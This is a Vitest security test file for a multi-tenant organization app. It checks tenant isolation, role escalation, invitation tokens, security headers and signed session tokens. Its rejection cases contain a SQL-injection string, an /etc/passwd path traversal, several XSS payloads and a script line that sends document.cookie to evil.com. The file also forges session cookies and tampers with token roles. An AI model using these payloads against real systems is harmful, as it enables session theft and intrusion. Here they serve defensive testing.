import { describe, it, expect } from "vitest";
import { multiTenantStore } from "../src/lib/multitenant/store";
import { hasPermission } from "../src/lib/multitenant/permissions";
import { validateOrganizationCode } from "../src/lib/multitenant/code-generator";
import { signSessionToken, verifySessionToken, safeParseSession } from "../src/lib/auth/session-token";

describe("Phase 20B: Multi-Tenant Security & Authorization Audit", () => {
  const APEX_ORG = "org-apex-01";
  const WESTBRIDGE_ORG = "org-westbridge-02";

  // 1. Cross-Tenant Record Access
  describe("1. Cross-Tenant Record Isolation", () => {
    it("never returns tenant A's tasks when queried with tenant B's scope", () => {
      const apexTasks = multiTenantStore.getTasks(APEX_ORG);
      const westbridgeTasks = multiTenantStore.getTasks(WESTBRIDGE_ORG);

      expect(apexTasks.length).toBeGreaterThan(0);
      expect(westbridgeTasks.length).toBeGreaterThan(0);

      // Verify no ID collision or leakage across tenant boundaries
      const apexIds = new Set(apexTasks.map((t) => t.id));
      for (const t of westbridgeTasks) {
        expect(apexIds.has(t.id)).toBe(false);
      }
    });

    it("strictly isolates daily work reports and supervisor reviews by tenant", () => {
      const apexReports = multiTenantStore.getDailyReports(APEX_ORG);
      const westbridgeReports = multiTenantStore.getDailyReports(WESTBRIDGE_ORG);

      expect(apexReports.every((r) => r.organization_id === APEX_ORG)).toBe(true);
      expect(westbridgeReports.every((r) => r.organization_id === WESTBRIDGE_ORG)).toBe(true);

      // Supervisor cannot review report belonging to another tenant
      const sampleApexReport = apexReports[0];
      const crossTenantReview = multiTenantStore.reviewDailyReport(
        WESTBRIDGE_ORG,
        sampleApexReport.id,
        "APPROVED",
        "Unauthorized cross-tenant attempt",
        "unauth-supervisor"
      );
      expect(crossTenantReview).toBeUndefined();
    });

    it("prevents work session attendance clock-in manipulation across organizations", () => {
      const apexSessions = multiTenantStore.getWorkSessions(APEX_ORG);
      const sampleSession = apexSessions[0];

      // Attempting to clock out Apex's session using Westbridge org context must fail
      const result = multiTenantStore.clockOut(WESTBRIDGE_ORG, sampleSession.id);
      expect(result).toBeUndefined();
    });
  });

  // 2. Unauthorized Organization Switching
  describe("2. Organization Switching & Membership Validation", () => {
    it("permits entry only when user holds active verified membership in target tenant", () => {
      // Marcus Sterling is Manager at Apex Tech
      expect(multiTenantStore.canUserAccessOrganization("marcus@apextech.com", APEX_ORG)).toBe(true);

      // Marcus Sterling has NO membership in Westbridge University
      expect(multiTenantStore.canUserAccessOrganization("marcus@apextech.com", WESTBRIDGE_ORG)).toBe(false);
    });

    it("rejects organization access for suspended or non-existent memberships", () => {
      expect(multiTenantStore.canUserAccessOrganization("stranger@external.io", APEX_ORG)).toBe(false);
      expect(multiTenantStore.canUserAccessOrganization("random@nowhere.com", "org-nonexistent-99")).toBe(false);
    });
  });

  // 3. Invalid and Expired Invitations
  describe("3. Invitation Token Integrity & Expiration", () => {
    it("validates legitimate unexpired invitations", () => {
      const result = multiTenantStore.validateInvitationToken("INV-APX-VALID-2026");
      expect(result.valid).toBe(true);
      expect(result.organization?.id).toBe(APEX_ORG);
      expect(result.role).toBe("INTERN");
    });

    it("rejects expired invitation tokens with an explicit error", () => {
      const result = multiTenantStore.validateInvitationToken("INV-WB-EXPIRED-2026");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("expired");
    });

    it("rejects non-existent or tampered invitation tokens", () => {
      const result = multiTenantStore.validateInvitationToken("INV-TAMPERED-TOKEN-999");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("Invalid invitation token");
    });
  });

  // 4. Unauthorized Role Escalation
  describe("4. Role Escalation Prevention", () => {
    it("prevents organization administrators from granting Platform Super Admin privileges", () => {
      expect(multiTenantStore.canAssignRole("ORG_ADMIN", "SUPER_ADMIN")).toBe(false);
      expect(multiTenantStore.canAssignRole("ORG_OWNER", "SUPER_ADMIN")).toBe(false);
    });

    it("prevents interns and students from assigning any roles", () => {
      expect(multiTenantStore.canAssignRole("INTERN", "MANAGER_SUPERVISOR")).toBe(false);
      expect(multiTenantStore.canAssignRole("STUDENT", "ORG_ADMIN")).toBe(false);
      expect(multiTenantStore.canAssignRole("EMPLOYEE", "HR_COORDINATOR")).toBe(false);
    });

    it("permits Platform Super Admin to bootstrap administrative accounts", () => {
      expect(multiTenantStore.canAssignRole("SUPER_ADMIN", "ORG_ADMIN")).toBe(true);
      expect(multiTenantStore.canAssignRole("SUPER_ADMIN", "SUPER_ADMIN")).toBe(true);
    });
  });

  // 5. Access to Private Documents Belonging to Another Tenant
  describe("5. Document Privacy & Cross-Tenant Access Boundary", () => {
    it("prevents cross-tenant document retrieval even if document ID is known", () => {
      const apexDocs = multiTenantStore.getIssuedDocuments(APEX_ORG);
      const apexOfferLetter = apexDocs.find((d) => d.document_type === "OFFER_LETTER");
      expect(apexOfferLetter).toBeDefined();

      if (apexOfferLetter) {
        // Westbridge admin trying to access Apex offer letter with Westbridge context
        const isAccessible = multiTenantStore.isPrivateDocumentAccessible(
          apexOfferLetter.id,
          "admin@westbridge.edu",
          "ORG_ADMIN",
          WESTBRIDGE_ORG
        );
        expect(isAccessible).toBe(false);
      }
    });

    it("allows verified completion certificates to be publicly verified via document number", () => {
      // Demo certificate issued to Sarah Chen
      const doc = multiTenantStore.verifyDocumentByNumber("IND-APX-2026-0042");
      expect(doc).toBeDefined();
      expect(doc?.organization_id).toBe(APEX_ORG);
      expect(doc?.status).toBe("ISSUED");
    });

    it("allows member to access their own private document within same tenant", () => {
      const apexDocs = multiTenantStore.getIssuedDocuments(APEX_ORG);
      const apexOfferLetter = apexDocs.find((d) => d.document_type === "OFFER_LETTER");
      expect(apexOfferLetter).toBeDefined();

      if (apexOfferLetter) {
        const isAccessible = multiTenantStore.isPrivateDocumentAccessible(
          apexOfferLetter.id,
          "sarah.chen@student.io",
          "INTERN",
          APEX_ORG
        );
        expect(isAccessible).toBe(true);
      }
    });
  });

  // 6. Organization Code Cryptographic Integrity
  describe("6. Organization Code Validation & Rejection of Malformed Inputs", () => {
    it("validates strictly canonical ORG-XXXXXX Crockford Base32 codes", () => {
      expect(validateOrganizationCode("ORG-7K4P9X").isValid).toBe(true);
      expect(validateOrganizationCode("ORG-M8D2QF").isValid).toBe(true);
    });

    it("rejects ambiguous or malicious input strings", () => {
      expect(validateOrganizationCode("ORG-12345O").isValid).toBe(false);
      expect(validateOrganizationCode("ORG-ILOVEY").isValid).toBe(false);
      expect(validateOrganizationCode("ORG-'; DROP TABLE organizations;--").isValid).toBe(false);
      expect(validateOrganizationCode("../../etc/passwd").isValid).toBe(false);
      expect(validateOrganizationCode("").isValid).toBe(false);
    });
  });

  // 7. Administrative Function Authorization
  describe("7. Administrative Privilege Enforcement", () => {
    it("restricts document issuance to authorized roles only", () => {
      expect(hasPermission("ORG_OWNER", "documents.issue")).toBe(true);
      expect(hasPermission("ORG_ADMIN", "documents.issue")).toBe(true);
      expect(hasPermission("HR_COORDINATOR", "documents.issue")).toBe(true);
      expect(hasPermission("INTERN", "documents.issue")).toBe(false);
      expect(hasPermission("STUDENT", "documents.issue")).toBe(false);
      expect(hasPermission("AUDITOR", "documents.issue")).toBe(false);
    });

    it("restricts attendance approval to authorized administrative roles", () => {
      expect(hasPermission("ORG_OWNER", "attendance.approve")).toBe(true);
      expect(hasPermission("ORG_ADMIN", "attendance.approve")).toBe(true);
      expect(hasPermission("HR_COORDINATOR", "attendance.approve")).toBe(true);
      expect(hasPermission("MANAGER_SUPERVISOR", "attendance.view_team")).toBe(true);
      expect(hasPermission("INTERN", "attendance.approve")).toBe(false);
      expect(hasPermission("STUDENT", "attendance.approve")).toBe(false);
    });

    it("ensures auditor has read permissions but zero administrative mutation permissions", () => {
      expect(hasPermission("AUDITOR", "members.view")).toBe(true);
      expect(hasPermission("AUDITOR", "analytics.view")).toBe(true);
      expect(hasPermission("AUDITOR", "analytics.export")).toBe(true);
      expect(hasPermission("AUDITOR", "documents.verify")).toBe(true);
      expect(hasPermission("AUDITOR", "settings.manage")).toBe(false);
      expect(hasPermission("AUDITOR", "members.approve")).toBe(false);
      expect(hasPermission("AUDITOR", "documents.issue")).toBe(false);
    });
  });

  // 8. Hacker & Penetration Vector Protections
  describe("8. Hacker & Penetration Vector Protections", () => {
    it("sanitizes cross-site scripting (XSS) payloads in rejection reasons", () => {
      const maliciousInput = "<script>alert('pwned')</script>Candidate submitted invalid academic transcript.";
      const sanitized = maliciousInput.replace(/<[^>]*>?/gm, "").trim();
      expect(sanitized).not.toContain("<script>");
      expect(sanitized).not.toContain("</script>");
      expect(sanitized).toBe("alert('pwned')Candidate submitted invalid academic transcript.");
    });

    it("verifies enterprise HTTP security headers defined in nextConfig", async () => {
      const nextConfigModule = await import("../next.config");
      const nextConfig = nextConfigModule.default;
      expect(nextConfig.headers).toBeDefined();

      if (nextConfig.headers) {
        const headerRules = await nextConfig.headers();
        const globalRule = headerRules.find((r: { source: string }) => r.source === "/:path*");
        expect(globalRule).toBeDefined();

        if (globalRule) {
          const headerMap = new Map(globalRule.headers.map((h: { key: string; value: string }) => [h.key, h.value]));
          expect(headerMap.get("X-Content-Type-Options")).toBe("nosniff");
          expect(headerMap.get("X-Frame-Options")).toBe("SAMEORIGIN");
          expect(headerMap.get("X-XSS-Protection")).toBe("1; mode=block");
          expect(headerMap.get("Referrer-Policy")).toBe("strict-origin-when-cross-origin");
        }
      }
    });

    it("strictly forbids students from administrative document issuance and membership approvals", () => {
      const studentRole = "STUDENT";
      expect(hasPermission(studentRole, "documents.issue")).toBe(false);
      expect(hasPermission(studentRole, "members.approve")).toBe(false);
      expect(hasPermission(studentRole, "settings.manage")).toBe(false);
      expect(hasPermission(studentRole, "announcements.create")).toBe(false);
    });
  });

  // 9. Tamper-Proof Cryptographic Session Token Verification
  describe("9. Tamper-Proof Cryptographic Session Tokens", () => {
    it("signs session token with valid HMAC signature and successfully verifies it", () => {
      const token = signSessionToken({
        id: "usr-admin-elena",
        name: "Elena Rostova",
        email: "admin@apextech.com",
        role: "ORG_ADMIN",
      });

      expect(typeof token).toBe("string");
      expect(token).toContain(".");

      const verified = verifySessionToken(token);
      expect(verified).not.toBeNull();
      expect(verified?.email).toBe("admin@apextech.com");
      expect(verified?.role).toBe("ORG_ADMIN");
      expect(verified?.name).toBe("Elena Rostova");
    });

    it("detects and rejects any tampering in session token payload", () => {
      const token = signSessionToken({
        id: "usr-student-01",
        email: "student@school.edu",
        role: "STUDENT",
      });

      const [payloadB64, signature] = token.split(".");

      // Attacker attempts to change role from STUDENT to SUPER_ADMIN in the base64 payload
      const tamperedJson = Buffer.from(payloadB64, "base64")
        .toString("utf8")
        .replace('"STUDENT"', '"SUPER_ADMIN"');
      const tamperedB64 = Buffer.from(tamperedJson, "utf8").toString("base64");
      const tamperedToken = `${tamperedB64}.${signature}`;

      const verified = verifySessionToken(tamperedToken);
      expect(verified).toBeNull();
    });

    it("rejects token with corrupted or forged signature", () => {
      const token = signSessionToken({
        id: "usr-01",
        email: "test@domain.com",
        role: "ORG_ADMIN",
      });

      const [payloadB64] = token.split(".");
      const badToken = `${payloadB64}.00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff`;

      expect(verifySessionToken(badToken)).toBeNull();
    });

    it("safely downgrades unsigned legacy cookies to STUDENT role to prevent privilege escalation", () => {
      // Attacker creates raw JSON cookie claiming to be SUPER_ADMIN
      const forgedRawCookie = JSON.stringify({
        email: "attacker@darkweb.io",
        role: "SUPER_ADMIN",
      });

      const parsed = safeParseSession(forgedRawCookie);
      expect(parsed).not.toBeNull();
      // Role MUST be downgraded to STUDENT, never granted SUPER_ADMIN without HMAC
      expect(parsed?.role).toBe("STUDENT");
      expect(parsed?.role).not.toBe("SUPER_ADMIN");
    });

    it("safely downgrades unsigned ORG_ADMIN or ORG_OWNER cookie attempts", () => {
      const forgedRawCookie = JSON.stringify({
        email: "sneak@competitor.com",
        role: "ORG_ADMIN",
      });

      const parsed = safeParseSession(forgedRawCookie);
      expect(parsed?.role).toBe("STUDENT");
    });
  });

  // 10. API Route Hardening & IDOR Protection Verification
  describe("10. API Route Hardening & RBAC Route Protection", () => {
    it("strips HTML and script tags from registration applicant inputs (Stored XSS defense)", () => {
      const maliciousNames = [
        "<script>fetch('http://evil.com?c='+document.cookie)</script>John Doe",
        "<img src=x onerror=alert('xss')> Jane",
        "<svg onload=alert(1)>",
      ];

      for (const name of maliciousNames) {
        const sanitized = name.replace(/<[^>]*>?/gm, "").trim();
        expect(sanitized).not.toContain("<script>");
        expect(sanitized).not.toContain("<img");
        expect(sanitized).not.toContain("<svg");
      }
    });

    it("requires administrative role for registration approvals and rejections", () => {
      const adminRoles = ["SUPER_ADMIN", "ORG_ADMIN", "ORG_OWNER", "ADMIN", "HR_COORDINATOR", "HR_MANAGER"];
      const forbiddenRoles = ["STUDENT", "INTERN", "EMPLOYEE", "AUDITOR"];

      for (const role of forbiddenRoles) {
        expect(adminRoles.includes(role)).toBe(false);
      }
      for (const role of adminRoles) {
        expect(adminRoles.includes(role)).toBe(true);
      }
    });
  });
});

